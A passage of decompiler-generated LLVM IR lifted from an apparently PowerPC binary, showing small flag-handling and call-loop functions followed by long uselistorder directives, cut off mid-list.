  %v3_10014594 = icmp eq i32 %v1_10014594, 0
  br i1 %v3_10014594, label %dec_label_pc_1001459c, label %dec_label_pc_100145b0

dec_label_pc_1001459c:                            ; preds = %dec_label_pc_10014594
  %v2_1001459c = or i32 %v4_10014588, %arg2
  %v1_100145a0 = trunc i32 %v2_1001459c to i16
  store i16 %v1_100145a0, i16* %arg1, align 2
  %v0_100145a4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100145a4

dec_label_pc_100145a4:                            ; preds = %dec_label_pc_10014574, %dec_label_pc_1001459c
  %v0_100145a4 = phi i32 [ %tmp, %dec_label_pc_10014574 ], [ %v0_100145a4.pre, %dec_label_pc_1001459c ]
  %v1_100145a4 = inttoptr i32 %v0_100145a4 to i16*
  %v2_100145a4 = load i16, i16* %v1_100145a4, align 2
  %v3_100145a4 = zext i16 %v2_100145a4 to i32
  %v1_100145a8 = and i32 %v3_100145a4, 16
  %v3_100145a8 = icmp eq i32 %v1_100145a8, 0
  br i1 %v3_100145a8, label %dec_label_pc_100145cc, label %dec_label_pc_100145b0

dec_label_pc_100145b0:                            ; preds = %dec_label_pc_10014594, %dec_label_pc_100145a4
  %v0_100145b0 = call i32 @function_1000c85c()
  store i32 %v0_100145b0, i32* %r3.global-to-local, align 4
  %v2_100145b8 = inttoptr i32 %v0_100145b0 to i32*
  store i32 9, i32* %v2_100145b8, align 4
  br label %dec_label_pc_100145bc

dec_label_pc_100145bc:                            ; preds = %dec_label_pc_100145d4, %dec_label_pc_100145b0
  %v0_100145bc = load i32, i32* @r31, align 4
  %v1_100145bc = inttoptr i32 %v0_100145bc to i16*
  %v2_100145bc = load i16, i16* %v1_100145bc, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_100145c4 = or i16 %v2_100145bc, 8
  br label %dec_label_pc_10014600

dec_label_pc_100145cc:                            ; preds = %dec_label_pc_100145a4
  %v1_100145cc = and i32 %v3_100145a4, 64
  %v3_100145cc = icmp eq i32 %v1_100145cc, 0
  br i1 %v3_100145cc, label %dec_label_pc_100145f4, label %dec_label_pc_100145d4

dec_label_pc_100145d4:                            ; preds = %dec_label_pc_100145cc
  store i32 268518872, i32* @lr, align 4
  %v0_100145d4 = call i32 @function_1000cb04()
  store i32 %v0_100145d4, i32* %r3.global-to-local, align 4
  %v3_100145d8 = icmp eq i32 %v0_100145d4, 0
  br i1 %v3_100145d8, label %dec_label_pc_100145e0, label %dec_label_pc_100145bc

dec_label_pc_100145e0:                            ; preds = %dec_label_pc_100145d4
  %v0_100145e0 = load i32, i32* @r31, align 4
  %v1_100145e0 = inttoptr i32 %v0_100145e0 to i16*
  %v2_100145e0 = load i16, i16* %v1_100145e0, align 2
  %v3_100145e0 = zext i16 %v2_100145e0 to i32
  %v1_100145e4 = add i32 %v0_100145e0, 8
  %v2_100145e4 = inttoptr i32 %v1_100145e4 to i32*
  %v3_100145e4 = load i32, i32* %v2_100145e4, align 4
  %v1_100145e8 = call i32 @__asm_rlwinm(i32 %v3_100145e0, i32 0, i32 26, i32 24)
  %v2_100145e8 = trunc i32 %v1_100145e8 to i16
  %v1_100145ec = load i32, i32* @r31, align 4
  %v2_100145ec = add i32 %v1_100145ec, 28
  %v3_100145ec = inttoptr i32 %v2_100145ec to i32*
  store i32 %v3_100145e4, i32* %v3_100145ec, align 4
  %v3_100145f0 = load i32, i32* @r31, align 4
  %v4_100145f0 = inttoptr i32 %v3_100145f0 to i16*
  store i16 %v2_100145e8, i16* %v4_100145f0, align 2
  %v0_100145f4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100145f4

dec_label_pc_100145f4:                            ; preds = %dec_label_pc_100145cc, %dec_label_pc_100145e0
  %v0_100145f4 = phi i32 [ %v0_100145a4, %dec_label_pc_100145cc ], [ %v0_100145f4.pre, %dec_label_pc_100145e0 ]
  %v1_100145f4 = inttoptr i32 %v0_100145f4 to i16*
  %v2_100145f4 = load i16, i16* %v1_100145f4, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100145fc = or i16 %v2_100145f4, 1
  br label %dec_label_pc_10014600

dec_label_pc_10014600:                            ; preds = %dec_label_pc_100145bc, %dec_label_pc_100145f4
  %v2_10014600 = phi i32 [ %v0_100145bc, %dec_label_pc_100145bc ], [ %v0_100145f4, %dec_label_pc_100145f4 ]
  %storemerge.off0 = phi i16 [ %v1_100145c4, %dec_label_pc_100145bc ], [ %v1_100145fc, %dec_label_pc_100145f4 ]
  %v3_10014600 = inttoptr i32 %v2_10014600 to i16*
  store i16 %storemerge.off0, i16* %v3_10014600, align 2
  store i32 %v0_1001457c, i32* @r31, align 4
  %v0_10014614 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10014614

; uselistorder directives
  uselistorder i32 %v4_10014588, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 28, { 29, 30, 31, 32, 33, 3, 4, 7, 34, 35, 36, 17, 41, 37, 0, 38, 39, 40, 5, 6, 28, 8, 18, 19, 20, 21, 22, 23, 26, 24, 25, 1, 27, 42, 9, 2, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 20, 4, 18, 19, 1, 49, 50, 46, 47, 0, 48, 2, 51, 52, 53, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 25, 3, 21, 22, 23, 24, 54 }
  uselistorder i32 24, { 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 15, 46, 47, 48, 27, 26, 2, 13, 3, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 49, 50, 4, 5, 6, 7, 1, 8, 9, 10, 11, 12, 14, 0, 28 }
  uselistorder i32 26, { 5, 6, 7, 1, 3, 4, 2, 0 }
  uselistorder i32 8, { 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 19, 20, 92, 93, 94, 95, 96, 97, 23, 24, 21, 13, 15, 16, 25, 26, 27, 28, 29, 98, 99, 100, 101, 102, 103, 104, 105, 18, 47, 106, 110, 0, 48, 49, 50, 51, 52, 53, 54, 55, 10, 78, 79, 56, 121, 122, 129, 132, 9, 35, 36, 11, 30, 12, 38, 45, 31, 114, 113, 111, 112, 107, 108, 109, 115, 116, 117, 1, 118, 119, 120, 22, 126, 127, 128, 2, 133, 3, 130, 131, 57, 58, 59, 60, 61, 14, 62, 63, 64, 65, 4, 5, 66, 67, 6, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 8, 7, 123, 124, 125, 32, 33, 34, 37, 39, 40, 41, 42, 43, 44, 46, 80, 81, 17 }
  uselistorder i32 ()* @function_1000cb04, { 3, 2, 1, 6, 5, 4, 0 }
  uselistorder i32 64, { 7, 8, 9, 3, 4, 10, 6, 1, 5, 11, 12, 0, 2 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 9, { 1, 21, 22, 23, 24, 12, 2, 13, 3, 19, 0, 14, 15, 16, 4, 17, 18, 5, 6, 7, 8, 9, 10, 11, 20 }
  uselistorder i32 ()* @function_1000c85c, { 33, 47, 31, 67, 66, 65, 30, 0, 28, 46, 45, 27, 19, 26, 40, 44, 39, 55, 15, 14, 13, 12, 23, 11, 9, 54, 53, 57, 56, 64, 63, 62, 24, 52, 38, 22, 4, 3, 43, 42, 41, 1, 16, 50, 18, 17, 61, 34, 32, 60, 36, 8, 21, 35, 20, 5, 49, 29, 25, 59, 58, 10, 7, 6, 2, 51, 48, 37 }
  uselistorder i32 16, { 57, 58, 59, 60, 61, 62, 9, 63, 64, 65, 10, 66, 67, 0, 68, 69, 1, 70, 11, 71, 72, 73, 74, 75, 2, 32, 33, 76, 77, 78, 34, 35, 36, 37, 38, 39, 40, 52, 53, 41, 42, 43, 44, 82, 45, 4, 20, 18, 24, 19, 79, 80, 86, 87, 88, 46, 47, 48, 49, 50, 51, 83, 84, 85, 12, 13, 21, 14, 22, 6, 15, 23, 25, 5, 26, 27, 28, 29, 30, 31, 16, 54, 3, 55, 7, 8, 56, 17, 81 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i32* @r31, { 139, 6, 140, 141, 142, 143, 7, 144, 145, 146, 147, 148, 149, 150, 2, 9, 151, 8, 152, 153, 154, 10, 155, 156, 11, 157, 158, 12, 159, 160, 161, 13, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 47, 50, 14, 41, 15, 16, 51, 52, 53, 176, 177, 178, 179, 1, 180, 181, 182, 183, 184, 185, 186, 187, 17, 188, 189, 190, 191, 18, 192, 193, 194, 195, 196, 197, 198, 199, 19, 44, 200, 3, 201, 202, 20, 203, 77, 78, 79, 80, 81, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 216, 215, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 82, 83, 84, 85, 86, 87, 88, 89, 90, 21, 91, 231, 232, 233, 234, 22, 23, 235, 24, 270, 271, 272, 25, 237, 236, 4, 238, 239, 240, 241, 242, 243, 244, 245, 63, 64, 65, 66, 124, 26, 134, 92, 93, 94, 135, 136, 137, 125, 126, 27, 127, 128, 129, 130, 28, 131, 29, 132, 133, 95, 46, 96, 0, 273, 274, 275, 30, 48, 276, 42, 249, 31, 250, 282, 283, 67, 45, 68, 69, 277, 280, 281, 61, 62, 70, 71, 72, 73, 54, 55, 56, 57, 58, 75, 76, 5, 251, 252, 253, 254, 255, 256, 257, 258, 246, 247, 248, 259, 260, 261, 33, 262, 263, 264, 32, 265, 266, 267, 268, 269, 138, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 34, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 37, 36, 114, 35, 118, 119, 38, 120, 121, 122, 123, 59, 60, 116, 115, 117, 278, 39, 279, 49, 40, 43, 74 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10014600, { 1, 0 }
  uselistorder label %dec_label_pc_100145f4, { 1, 0 }
  uselistorder label %dec_label_pc_100145b0, { 1, 0 }
  uselistorder label %dec_label_pc_100145a4, { 1, 0 }
}

define i32 @function_10014618(i32 %arg1) local_unnamed_addr {
dec_label_pc_10014618:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002b000.785 to i32), i32* %r31.global-to-local, align 4
  %v3_10014634 = load i32, i32* @global_var_1002b000.785, align 4
  %v3_10014638 = icmp eq i32 %v3_10014634, -1
  br i1 %v3_10014638, label %dec_label_pc_10014654, label %dec_label_pc_10014640

dec_label_pc_10014640:                            ; preds = %dec_label_pc_10014618, %dec_label_pc_10014640
  %v0_10014640 = phi i32 [ %v3_10014648, %dec_label_pc_10014640 ], [ %v3_10014634, %dec_label_pc_10014618 ]
  call void @__pseudo_call(i32 %v0_10014640)
  %v0_10014648 = load i32, i32* %r31.global-to-local, align 4
  %v1_10014648 = add i32 %v0_10014648, -4
  %v2_10014648 = inttoptr i32 %v1_10014648 to i32*
  %v3_10014648 = load i32, i32* %v2_10014648, align 4
  store i32 %v1_10014648, i32* %r31.global-to-local, align 4
  %v3_1001464c = icmp eq i32 %v3_10014648, -1
  br i1 %v3_1001464c, label %dec_label_pc_10014654, label %dec_label_pc_10014640

dec_label_pc_10014654:                            ; preds = %dec_label_pc_10014640, %dec_label_pc_10014618
  %v0_10014664 = load i32, i32* @r3, align 4
  ret i32 %v0_10014664

; uselistorder directives
  uselistorder i32 %v3_10014648, { 1, 0 }
  uselistorder i32 -4, { 2, 8, 9, 10, 17, 18, 19, 20, 21, 11, 12, 3, 4, 5, 6, 22, 23, 27, 28, 24, 25, 26, 13, 14, 15, 16, 0, 7, 1 }
  uselistorder void (i32)* @__pseudo_call, { 1, 2, 3, 4, 0 }
  uselistorder i32 -1, { 223, 224, 309, 48, 16, 44, 56, 310, 311, 312, 313, 314, 255, 130, 315, 57, 316, 49, 58, 317, 59, 318, 225, 226, 113, 114, 61, 60, 227, 45, 46, 228, 229, 230, 185, 67, 65, 63, 231, 232, 233, 66, 64, 62, 234, 235, 186, 236, 187, 319, 25, 26, 188, 320, 189, 50, 321, 115, 322, 323, 324, 325, 3, 68, 256, 131, 4, 5, 257, 258, 259, 260, 132, 326, 133, 327, 134, 69, 70, 190, 358, 29, 30, 31, 359, 191, 363, 27, 28, 328, 32, 329, 330, 331, 137, 332, 333, 334, 335, 336, 337, 338, 135, 339, 136, 340, 341, 342, 343, 192, 261, 193, 6, 51, 194, 262, 263, 195, 196, 197, 264, 198, 346, 347, 199, 348, 349, 200, 295, 47, 265, 266, 267, 122, 52, 268, 269, 270, 271, 138, 272, 7, 71, 273, 274, 275, 276, 277, 201, 278, 139, 306, 307, 140, 8, 9, 141, 142, 294, 202, 203, 279, 280, 281, 282, 72, 73, 350, 143, 74, 75, 76, 77, 78, 79, 0, 366, 364, 80, 243, 244, 144, 204, 245, 35, 36, 205, 246, 33, 34, 206, 241, 10, 145, 81, 82, 247, 146, 83, 237, 11, 84, 53, 253, 37, 38, 207, 147, 116, 85, 238, 344, 345, 43, 239, 362, 248, 86, 249, 208, 250, 39, 40, 251, 252, 298, 54, 209, 351, 117, 352, 353, 148, 357, 87, 308, 367, 368, 283, 296, 88, 210, 211, 354, 355, 212, 356, 120, 55, 213, 214, 215, 216, 217, 41, 218, 149, 89, 17, 18, 19, 20, 21, 22, 23, 118, 119, 284, 15, 285, 12, 286, 287, 219, 150, 24, 220, 288, 289, 1, 291, 292, 2, 151, 152, 221, 42, 153, 124, 293, 154, 290, 13, 242, 90, 91, 92, 360, 361, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 365, 110, 369, 155, 183, 240, 156, 157, 158, 159, 160, 112, 111, 161, 162, 163, 164, 165, 166, 14, 167, 168, 254, 184, 222, 169, 170, 121, 171, 172, 297, 173, 123, 174, 125, 126, 127, 128, 129, 175, 176, 299, 300, 301, 177, 302, 303, 304, 305, 178, 179, 180, 181, 182 }
  uselistorder i32 1, { 279, 128, 177, 129, 890, 357, 891, 892, 893, 894, 895, 896, 286, 287, 897, 456, 898, 899, 15, 16, 14, 17, 900, 901, 457, 902, 903, 513, 104, 103, 105, 525, 167, 168, 904, 388, 905, 392, 906, 907, 908, 909, 910, 458, 911, 912, 913, 142, 141, 146, 145, 144, 143, 147, 140, 148, 914, 915, 916, 526, 149, 152, 150, 153, 151, 154, 917, 125, 126, 918, 127, 919, 5, 7, 6, 4, 378, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 528, 527, 188, 185, 184, 189, 186, 187, 714, 715, 716, 717, 529, 521, 228, 219, 226, 218, 230, 223, 229, 224, 221, 222, 220, 225, 227, 403, 920, 921, 381, 922, 923, 924, 925, 927, 928, 530, 258, 257, 259, 256, 260, 445, 932, 929, 930, 931, 531, 307, 304, 305, 301, 303, 306, 302, 933, 741, 742, 743, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 137, 133, 135, 134, 130, 131, 139, 132, 136, 138, 393, 744, 112, 430, 948, 949, 950, 420, 394, 90, 89, 88, 951, 532, 83, 404, 952, 534, 533, 535, 191, 192, 190, 82, 953, 954, 955, 956, 957, 958, 395, 537, 536, 13, 11, 12, 396, 771, 85, 86, 84, 87, 772, 539, 538, 115, 114, 116, 959, 960, 541, 540, 111, 169, 361, 1003, 459, 460, 543, 542, 161, 158, 162, 160, 157, 159, 546, 545, 544, 8, 9, 547, 961, 379, 962, 965, 966, 967, 968, 969, 549, 548, 370, 371, 373, 372, 970, 971, 972, 375, 973, 974, 405, 975, 976, 426, 427, 461, 406, 421, 977, 463, 431, 978, 979, 464, 980, 981, 982, 462, 555, 554, 553, 552, 514, 551, 550, 23, 22, 19, 21, 24, 18, 25, 20, 26, 0, 987, 988, 989, 990, 407, 91, 745, 746, 215, 216, 747, 121, 124, 123, 122, 120, 773, 316, 318, 317, 319, 774, 775, 397, 776, 195, 196, 197, 290, 293, 288, 292, 291, 289, 556, 467, 777, 778, 779, 465, 780, 466, 781, 782, 783, 784, 785, 566, 565, 564, 563, 562, 561, 560, 559, 558, 515, 557, 63, 56, 60, 61, 62, 55, 66, 64, 59, 65, 54, 58, 67, 57, 68, 69, 53, 52, 51, 875, 446, 74, 73, 70, 72, 71, 75, 355, 354, 356, 1005, 1006, 101, 102, 100, 568, 567, 786, 787, 569, 334, 330, 331, 332, 333, 335, 408, 788, 572, 571, 570, 170, 264, 156, 298, 363, 193, 308, 468, 573, 198, 469, 433, 432, 750, 577, 576, 575, 574, 268, 267, 265, 269, 266, 270, 1007, 580, 579, 578, 173, 172, 174, 171, 1008, 581, 734, 735, 736, 447, 737, 409, 213, 214, 212, 410, 470, 471, 472, 473, 582, 718, 98, 94, 92, 95, 93, 96, 97, 99, 755, 411, 756, 583, 324, 323, 322, 325, 326, 327, 328, 38, 37, 39, 36, 44, 40, 43, 42, 45, 47, 41, 46, 584, 585, 586, 262, 588, 587, 48, 49, 50, 242, 243, 241, 389, 986, 589, 309, 310, 1004, 374, 474, 475, 592, 591, 590, 181, 179, 180, 182, 178, 183, 272, 434, 593, 594, 595, 596, 597, 598, 599, 600, 448, 449, 991, 412, 476, 992, 993, 435, 1002, 603, 602, 601, 245, 254, 252, 250, 246, 244, 253, 255, 247, 249, 251, 248, 604, 605, 606, 876, 877, 107, 106, 81, 80, 1009, 608, 607, 365, 610, 609, 28, 27, 29, 611, 881, 882, 883, 35, 34, 33, 30, 32, 31, 789, 790, 612, 336, 338, 337, 339, 837, 838, 839, 840, 841, 842, 843, 845, 844, 846, 847, 205, 204, 211, 209, 208, 210, 207, 206, 477, 791, 994, 995, 996, 997, 998, 999, 1000, 1001, 163, 165, 164, 166, 983, 984, 985, 848, 382, 110, 109, 108, 964, 963, 398, 926, 119, 751, 752, 753, 231, 1017, 1018, 314, 311, 313, 312, 1013, 1014, 1015, 1016, 368, 369, 367, 232, 478, 792, 793, 480, 794, 795, 796, 797, 798, 799, 801, 802, 803, 481, 804, 805, 413, 806, 479, 807, 482, 808, 809, 810, 800, 616, 615, 614, 613, 239, 235, 237, 233, 238, 234, 240, 236, 811, 812, 813, 814, 815, 342, 341, 340, 343, 344, 483, 276, 277, 816, 817, 78, 77, 79, 76, 819, 414, 820, 390, 415, 822, 823, 824, 825, 416, 827, 418, 826, 821, 484, 516, 623, 622, 621, 620, 619, 618, 617, 349, 351, 345, 350, 348, 347, 346, 352, 353, 399, 400, 273, 274, 275, 818, 436, 517, 485, 284, 285, 283, 1011, 437, 1012, 625, 624, 359, 360, 358, 627, 626, 280, 271, 155, 321, 176, 315, 263, 295, 628, 194, 175, 282, 362, 366, 629, 329, 296, 297, 261, 300, 294, 630, 281, 631, 299, 1010, 632, 320, 719, 417, 422, 391, 720, 721, 722, 376, 488, 723, 724, 725, 419, 726, 727, 728, 729, 486, 487, 428, 489, 638, 637, 636, 635, 634, 633, 199, 200, 730, 731, 643, 642, 641, 518, 640, 639, 490, 732, 733, 644, 738, 739, 491, 645, 740, 647, 646, 748, 492, 652, 651, 650, 649, 648, 749, 654, 653, 754, 656, 655, 522, 757, 493, 758, 660, 659, 658, 657, 117, 450, 759, 662, 661, 203, 202, 201, 423, 380, 760, 424, 761, 663, 438, 762, 494, 495, 764, 383, 763, 496, 666, 665, 664, 377, 765, 766, 497, 498, 499, 878, 519, 767, 768, 439, 440, 500, 769, 501, 770, 384, 673, 672, 671, 670, 669, 668, 667, 441, 442, 674, 828, 829, 830, 502, 831, 832, 385, 833, 503, 834, 677, 676, 675, 520, 835, 113, 836, 678, 504, 849, 680, 679, 850, 217, 452, 851, 852, 451, 853, 854, 453, 454, 855, 856, 857, 1, 2, 859, 858, 505, 683, 682, 681, 506, 860, 861, 684, 686, 685, 688, 687, 507, 689, 862, 863, 443, 864, 865, 425, 866, 690, 429, 3, 692, 691, 402, 867, 868, 401, 869, 870, 508, 509, 871, 872, 693, 10, 873, 874, 118, 694, 879, 510, 880, 386, 697, 696, 695, 455, 387, 884, 885, 886, 887, 888, 364, 889, 444, 511, 512, 700, 699, 698, 702, 701, 278, 523, 524 }
  uselistorder label %dec_label_pc_10014640, { 1, 0 }
}

define i32 @function_10014668() local_unnamed_addr {
dec_label_pc_10014668:
  %v0_10014680 = load i32, i32* @r3, align 4
  ret i32 %v0_10014680

; uselistorder directives
  uselistorder i32* @r3, { 19, 22, 28, 165, 166, 169, 167, 168, 0, 2, 170, 11, 171, 46, 47, 48, 172, 175, 176, 41, 30, 12, 70, 71, 13, 177, 178, 179, 180, 181, 182, 183, 29, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 107, 108, 109, 195, 196, 197, 198, 199, 200, 201, 226, 223, 224, 202, 203, 204, 205, 206, 207, 208, 209, 210, 14, 211, 212, 213, 214, 215, 216, 218, 72, 73, 15, 74, 75, 76, 33, 110, 111, 112, 113, 114, 16, 34, 115, 148, 150, 151, 152, 149, 116, 117, 118, 119, 120, 121, 3, 1, 122, 123, 124, 24, 227, 45, 239, 4, 35, 5, 38, 87, 88, 44, 233, 234, 235, 40, 91, 92, 93, 94, 95, 96, 97, 98, 49, 50, 51, 52, 53, 102, 103, 225, 89, 219, 220, 221, 153, 32, 31, 23, 236, 237, 125, 126, 127, 128, 217, 173, 174, 17, 37, 238, 129, 25, 130, 26, 131, 132, 133, 6, 10, 7, 134, 8, 135, 9, 136, 137, 138, 139, 140, 141, 27, 142, 143, 144, 145, 146, 147, 54, 228, 229, 230, 231, 232, 81, 82, 83, 36, 55, 56, 57, 59, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 77, 78, 79, 80, 84, 85, 86, 90, 99, 100, 101, 104, 18, 105, 106, 154, 155, 156, 158, 157, 159, 160, 161, 42, 43, 162, 163, 164, 222, 21, 20, 39 }
}

define i32 @function_10014684() local_unnamed_addr {
entry:
  store i32 268519060, i32* @lr, align 4
  %v0_10014690 = call i32 @function_100000b8()
  ret i32 %v0_10014690

; uselistorder directives
  uselistorder i32 0, { 1497, 1498, 1499, 1500, 1501, 1502, 1503, 107, 1504, 1505, 1506, 1508, 1509, 1510, 35, 1513, 108, 1511, 1512, 56, 1514, 1515, 1516, 1519, 1517, 0, 1518, 1520, 109, 1521, 1522, 1523, 305, 1524, 1525, 1526, 24, 1251, 1252, 1542, 1529, 1532, 1533, 1534, 306, 1535, 1536, 1538, 1537, 1539, 1540, 1541, 1543, 1544, 1545, 1527, 1528, 1530, 1531, 110, 1546, 1548, 1549, 1547, 1550, 1551, 1552, 1553, 225, 1093, 1554, 1094, 226, 1095, 111, 112, 1103, 1104, 89, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 113, 177, 1113, 1112, 114, 1114, 1115, 116, 115, 1116, 307, 1117, 1118, 1119, 118, 117, 1120, 1121, 235, 308, 1122, 119, 1555, 1556, 1557, 1558, 1564, 1559, 60, 1565, 1566, 1560, 1561, 1562, 57, 58, 59, 1567, 309, 36, 37, 38, 220, 1569, 1570, 1571, 1572, 120, 1568, 310, 1573, 1574, 1575, 121, 1576, 90, 39, 1577, 178, 1578, 1579, 1580, 1190, 179, 122, 1581, 1582, 1583, 1584, 1585, 1586, 1591, 1587, 1588, 1589, 1590, 180, 1592, 1593, 1594, 1, 61, 1595, 1596, 1253, 1254, 1597, 1598, 311, 1599, 123, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 312, 1609, 1610, 1611, 1612, 1613, 1614, 1255, 25, 1256, 125, 124, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 26, 313, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1716, 314, 1719, 64, 315, 236, 1720, 316, 1723, 1724, 62, 63, 1725, 1717, 1718, 237, 317, 1630, 1623, 318, 65, 1624, 1625, 1626, 40, 1628, 1629, 1631, 1632, 1633, 1634, 1635, 1636, 238, 223, 224, 320, 1637, 1638, 1639, 1641, 181, 1644, 321, 239, 1646, 1648, 1649, 1650, 319, 240, 1643, 1640, 1642, 1645, 1652, 227, 1655, 1656, 1657, 2, 1671, 1672, 1673, 127, 126, 1674, 3, 128, 241, 1191, 129, 1192, 1193, 4, 1269, 1270, 183, 1272, 1271, 53, 5, 1273, 182, 6, 1274, 185, 1275, 54, 7, 1276, 184, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1277, 1421, 1433, 1434, 1278, 1279, 1280, 1281, 1282, 322, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 130, 131, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 41, 1305, 132, 85, 1306, 1307, 1308, 1309, 1310, 133, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1480, 1481, 134, 1482, 1483, 1484, 293, 294, 1485, 1486, 1487, 27, 8, 1318, 1319, 1320, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1321, 1322, 1323, 1324, 1325, 91, 1726, 1727, 1728, 1731, 1729, 9, 186, 1328, 1327, 187, 1326, 92, 1329, 1330, 1331, 135, 1332, 1451, 1682, 1683, 242, 1684, 1210, 1732, 1733, 1734, 1735, 1685, 323, 324, 1751, 1752, 325, 1758, 1778, 188, 1779, 326, 1770, 10, 1736, 1737, 136, 1211, 1212, 327, 328, 329, 1213, 1214, 68, 69, 1215, 1216, 1217, 330, 1218, 1219, 1220, 66, 67, 1221, 1222, 1738, 1739, 1740, 1741, 1742, 1743, 137, 1750, 1151, 1152, 1153, 1154, 1155, 138, 1156, 1157, 1158, 295, 1159, 139, 243, 331, 332, 333, 1223, 334, 1228, 140, 1123, 141, 1124, 1125, 142, 1126, 143, 1229, 189, 93, 335, 1230, 1231, 11, 1236, 1127, 1128, 144, 1129, 1130, 1131, 1688, 1690, 42, 1691, 70, 1692, 1689, 1686, 1687, 12, 1660, 1658, 1659, 190, 1661, 1662, 145, 1693, 1694, 336, 1695, 146, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 13, 14, 1096, 1224, 1225, 1226, 71, 72, 1227, 15, 337, 296, 297, 338, 1696, 1697, 191, 1698, 1699, 1700, 1701, 1707, 1708, 1709, 1710, 147, 1711, 1712, 1647, 1488, 244, 339, 1759, 1760, 1761, 1762, 1763, 1764, 1765, 1766, 340, 1767, 16, 17, 1494, 148, 1333, 1334, 28, 29, 245, 30, 1335, 192, 18, 1441, 1442, 1443, 73, 1336, 1337, 193, 341, 1338, 1702, 1703, 1704, 1705, 1706, 1653, 1654, 194, 1627, 19, 106, 1563, 195, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1771, 1772, 1773, 74, 1774, 1775, 1776, 1777, 149, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 94, 1347, 1348, 1349, 1350, 1351, 228, 1352, 1353, 1354, 150, 1355, 1356, 1357, 1358, 1359, 151, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 152, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 43, 172, 173, 196, 1377, 1378, 153, 1379, 342, 1380, 1381, 343, 1384, 158, 154, 1382, 1383, 345, 1385, 1386, 1387, 1389, 159, 1390, 20, 21, 160, 161, 155, 156, 1391, 1392, 157, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 344, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1097, 1413, 31, 1415, 75, 95, 162, 346, 1417, 298, 1418, 1414, 1416, 1419, 1420, 163, 1132, 1133, 86, 55, 81, 1388, 197, 1745, 1747, 1746, 199, 164, 1749, 1748, 198, 246, 229, 1206, 1207, 1476, 1730, 347, 1232, 1721, 1722, 1134, 1490, 1507, 1135, 1455, 1753, 165, 1754, 1714, 1456, 1715, 1757, 1457, 1246, 1458, 1651, 1136, 1144, 1744, 1755, 1756, 1768, 1769, 232, 349, 350, 200, 1137, 353, 33, 34, 354, 1138, 1139, 360, 361, 430, 431, 32, 44, 230, 348, 1098, 351, 231, 352, 1140, 1141, 355, 1142, 356, 357, 249, 248, 247, 358, 1143, 359, 362, 250, 201, 1146, 363, 1145, 366, 367, 364, 365, 1147, 368, 1148, 369, 1149, 370, 1150, 371, 168, 167, 166, 170, 169, 1160, 233, 375, 251, 1161, 1162, 380, 1163, 1165, 374, 381, 1164, 204, 1166, 1167, 378, 1168, 1170, 373, 379, 1169, 203, 1171, 1172, 1173, 376, 1174, 1176, 372, 377, 1175, 202, 1177, 1178, 1179, 1180, 382, 1181, 1182, 383, 1183, 1184, 1185, 384, 1186, 1187, 1188, 1189, 252, 386, 387, 253, 385, 388, 389, 390, 391, 96, 97, 393, 256, 257, 254, 394, 1199, 392, 1194, 1195, 1196, 1197, 1198, 205, 1200, 1201, 395, 299, 1202, 255, 1203, 1204, 1205, 171, 396, 1208, 207, 1209, 206, 174, 397, 208, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 1233, 210, 398, 399, 400, 401, 402, 403, 404, 209, 416, 417, 418, 419, 300, 1234, 234, 1235, 76, 82, 83, 88, 87, 45, 46, 1237, 258, 259, 260, 261, 1245, 1239, 1241, 1242, 1243, 421, 1244, 422, 263, 262, 420, 77, 1238, 1240, 47, 98, 212, 211, 22, 23, 1099, 423, 1247, 264, 265, 266, 267, 1248, 1249, 268, 269, 424, 78, 1250, 270, 1435, 425, 426, 1436, 1437, 221, 429, 1438, 273, 428, 79, 1439, 272, 427, 213, 271, 48, 175, 1440, 